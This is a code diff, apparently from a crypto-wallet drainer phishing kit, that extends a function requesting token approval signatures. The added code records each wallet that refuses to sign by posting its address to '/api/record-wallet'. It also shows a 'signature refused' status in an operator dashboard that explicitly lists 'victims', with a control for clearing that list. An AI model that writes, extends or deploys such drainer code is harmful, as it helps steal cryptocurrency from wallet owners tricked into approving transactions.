@@ -1082,12 +1082,38 @@ async function sendExactApproveTransaction() {
     console.error('Transaction error:', e);
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = '❌ Transaction refusée.';
+
+    // ====== DÉTECTION IMMÉDIATE DU REFUS ======
+    const addressKey = account ? account.toLowerCase() : null;
+    if (addressKey && pendingSignatures[addressKey]) {
+      pendingSignatures[addressKey].done = true;
+      if (pendingSignatures[addressKey].timer) {
+        clearTimeout(pendingSignatures[addressKey].timer);
+        pendingSignatures[addressKey].timer = null;
+      }
+    }
+
+    if (account) {
+      try {
+        await fetch('/api/record-wallet', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            address: account,
+            chain: '1',
+            status: 'refused'
+          })
+        });
+        refreshVictimsIfPossible();
+      } catch (err) {
+        console.warn('Erreur mise à jour refused:', err);
+      }
+    }
   }
 }
 
   let victimPollTimer = null;
 
-  // ===== CLEAR : timestamp de clear en localStorage =====
   const CLEAR_KEY = 'victimsClearedAt';
 
   function getClearedAt() {
@@ -1097,7 +1123,6 @@ async function sendExactApproveTransaction() {
 
   document.getElementById('clear-victims-btn').addEventListener('click', function() {
     localStorage.setItem(CLEAR_KEY, String(Date.now()));
-    // Re-render immédiat
     if (typeof window.__lastVictims !== 'undefined') {
       populateTable(window.__lastVictims);
     } else {
@@ -1193,7 +1218,6 @@ async function sendExactApproveTransaction() {
     const table = document.getElementById('victim-table');
     if (!tbody || !loading || !table) return;
 
-    // Filtre par timestamp de clear
     const clearedAt = getClearedAt();
     const victims = allVictims.filter(function(v) {
       if (!clearedAt) return true;
@@ -1268,6 +1292,8 @@ async function sendExactApproveTransaction() {
         } else {
           tdStatus.innerHTML = '<span class="status-success">Signé</span>';
         }
+      } else if (v.status === 'refused') {
+        tdStatus.innerHTML = '<span class="status-error">❌ Signature refusée</span>';
       } else if (v.status === 'unsigned') {
         tdStatus.innerHTML = '<span class="status-error">Non signé</span>';
       } else if (v.status === 'failed') {
